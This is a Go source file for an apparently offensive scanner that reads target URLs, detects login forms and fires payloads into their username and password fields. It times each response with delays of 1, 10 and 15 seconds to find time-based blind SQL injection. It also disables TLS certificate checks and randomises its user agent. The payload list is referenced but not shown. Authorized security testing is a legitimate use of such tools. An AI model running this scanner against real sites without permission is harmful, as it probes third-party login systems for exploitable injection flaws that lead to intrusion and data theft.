package main

import (
	"bufio"
	"crypto/tls"
	"fmt"
	"io"
	"time"

	//"log"
	"net/http"
	"net/url"
	"os"
	"strings"
	"sync"

	"golang.org/x/net/html"
)

var UserAgent string = getRandomUserAgent()

type LoginInfo struct {
	URL           string
	Method        string
	HiddenParams  map[string]string
	UsernameField string
	PasswordField string
}

var wg sync.WaitGroup

// XMLHttpRequest
// application/x-niagara-login-support

func main() {
	scanner := bufio.NewScanner(os.Stdin)

	for scanner.Scan() {
		targetURL := scanner.Text()

		wg.Add(1)
		go func() {
			defer wg.Done()
			response1, LastUrl, err := makeRequest(targetURL)
			if err == nil {
				loginInfo, Cookies, err := VisitAndDetectLoginElements(response1)
				//log.Println("======", Cookies)
				if err == nil {
					response2, _, err := makeRequest(targetURL)
					if err == nil {

						requestType, err := DetectLoginRequestType(response2)

						//log.Println(requestType)

						if err == nil {
							if requestType == PostParameters {
								var reqMethod string
								if loginInfo.Method == "POST" || loginInfo.Method == "post" {
									reqMethod = "POST"

								}

								loginUrl := targetURL
								if strings.Contains(loginInfo.URL, "http") == true {
									loginUrl = loginInfo.URL

								} else {
									if strings.HasPrefix(loginInfo.URL, "/") == false {
										loginUrl = targetURL + "/" + loginInfo.URL
									}
									if strings.HasPrefix(loginInfo.URL, "./") == true {
										//loginUrl = targetURL + "/" + loginInfo.URL
										clearLoginUrl := strings.Replace(loginInfo.URL, "./", "/", 1)
										loginUrl = targetURL + clearLoginUrl
									} else {
										loginUrl = targetURL + loginInfo.URL
									}

								}
								if len(loginInfo.URL) < 1 && targetURL != LastUrl {
									loginUrl = LastUrl
								}

								for _, Payload := range UsersPass {
									payLoad1 := strings.ReplaceAll(Payload, "__TIME__", "1")
									_, time1_username, err1 := PostParametersLogin(loginUrl, reqMethod, loginInfo.HiddenParams, loginInfo.UsernameField, payLoad1, loginInfo.PasswordField, "password", Cookies)
									_, time1_password, err1 := PostParametersLogin(loginUrl, reqMethod, loginInfo.HiddenParams, loginInfo.UsernameField, "username", loginInfo.PasswordField, payLoad1, Cookies)

									if err1 == nil {
										payLoad2 := strings.ReplaceAll(Payload, "__TIME__", "10")
										_, time2_username, err2 := PostParametersLogin(loginUrl, reqMethod, loginInfo.HiddenParams, loginInfo.UsernameField, payLoad2, loginInfo.PasswordField, "password", Cookies)
										_, time2_password, err2 := PostParametersLogin(loginUrl, reqMethod, loginInfo.HiddenParams, loginInfo.UsernameField, "username", loginInfo.PasswordField, payLoad2, Cookies)
										if err2 == nil {
											payLoad3 := strings.ReplaceAll(Payload, "__TIME__", "15")
											_, time3_username, err3 := PostParametersLogin(loginUrl, reqMethod, loginInfo.HiddenParams, loginInfo.UsernameField, payLoad3, loginInfo.PasswordField, "password", Cookies)
											_, time3_password, err3 := PostParametersLogin(loginUrl, reqMethod, loginInfo.HiddenParams, loginInfo.UsernameField, "username", loginInfo.PasswordField, payLoad3, Cookies)

											if err3 == nil {
												if time1_username < 5 && (time2_username >= 10 && time2_username < 15) && (time3_username > 15 && time3_username < 20) {
													fmt.Println(loginUrl, "username ", time1_username, time2_username, time3_username)
												}
												if time1_password < 5 && (time2_password >= 10 && time2_password < 15) && (time3_password > 15 && time3_password < 20) {
													fmt.Println(loginUrl, "password ", time1_password, time2_password, time3_password)
												}

											}

										}
									}

								}

							}

						}

					}

				}

			}

		}()

	}
	wg.Wait()

}

func makeRequest(targetURL string) (*http.Response, string, error) {
	// Create HTTP client with TLS verification disabled
	tr := &http.Transport{
		TLSClientConfig: &tls.Config{InsecureSkipVerify: true},
	}

	// Variable to hold the final URL after redirections
	var finalURL string

	// Map to track visited URLs to prevent visiting the same URL multiple times
	visitedURLs := make(map[string]bool)

	// Define the HTTP client with the transport settings and a 10-second timeout
	client := &http.Client{
		Transport: tr,
		Timeout:   25 * time.Second, // Set the timeout to 10 seconds
		// Allow redirections and keep track of the final URL
		CheckRedirect: func(req *http.Request, via []*http.Request) error {
			if len(via) >= 10 {
				// Limit the number of redirects to 10 to avoid infinite loops
				return http.ErrUseLastResponse
			}
			finalURL = req.URL.String() // Update the final URL on each redirect
			return nil
		},
	}

	// Function to handle meta refresh redirects
	var followMetaRefresh func(resp *http.Response) (*http.Response, error)
	followMetaRefresh = func(resp *http.Response) (*http.Response, error) {
		// Read the response body
		bodyBytes, err := io.ReadAll(resp.Body)
		if err != nil {
			return nil, err
		}
		resp.Body.Close()

		// Convert the body to a string for inspection
		bodyStr := string(bodyBytes)

		// Check if the body contains a meta refresh tag
		doc, err := html.Parse(strings.NewReader(bodyStr))
		if err != nil {
			return nil, err
		}

		var metaRefreshURL string
		var f func(*html.Node)
		f = func(n *html.Node) {
			if n.Type == html.ElementNode && n.Data == "meta" {
				// Check for meta refresh tag
				httpEquiv := getAttribute(n, "http-equiv")
				content := getAttribute(n, "content")
				if strings.ToLower(httpEquiv) == "refresh" && strings.Contains(content, "url=") {
					// Extract the URL from the content attribute
					parts := strings.SplitN(content, "url=", 2)
					if len(parts) == 2 {
						metaRefreshURL = strings.TrimSpace(parts[1])
					}
				}
			}
			for c := n.FirstChild; c != nil; c = c.NextSibling {
				f(c)
			}
		}
		f(doc)

		// If a meta refresh URL is found and it's different from the previous one, follow it
		if metaRefreshURL != "" && metaRefreshURL != finalURL && !visitedURLs[metaRefreshURL] {
			// Log meta refresh redirect
			// fmt.Println("Meta refresh redirect found to:", metaRefreshURL)

			// Parse the base URL
			baseURL, err := url.Parse(resp.Request.URL.String())
			if err != nil {
				return nil, err
			}

			// Resolve the meta refresh URL against the base URL
			refreshedURL, err := baseURL.Parse(metaRefreshURL)
			if err != nil {
				return nil, err
			}
			// Log resolved URL
			// fmt.Println("Resolved URL:", refreshedURL.String())

			// Mark the meta refresh URL as visited
			visitedURLs[metaRefreshURL] = true

			// Make a new request to the resolved URL
			newResp, err := client.Get(refreshedURL.String())
			if err != nil {
				return nil, err
			}
			finalURL = newResp.Request.URL.String()
			return followMetaRefresh(newResp) // Recursively handle possible further meta refreshes
		}

		// Restore the original body for the caller
		resp.Body = io.NopCloser(strings.NewReader(bodyStr))
		return resp, nil
	}

	// Make the initial GET request to the target URL
	resp, err := client.Get(targetURL)
	if err != nil {
		return nil, targetURL, err
	}

	// Determine the final URL after HTTP redirects
	if finalURL == "" {
		finalURL = resp.Request.URL.String()
	}

	// Check for meta refresh and follow it if present
	resp, err = followMetaRefresh(resp)
	if err != nil {
		return nil, targetURL, err
	}

	// Print the final URL after handling all redirects
	// fmt.Println("Final URL:", finalURL)

	return resp, finalURL, nil
}
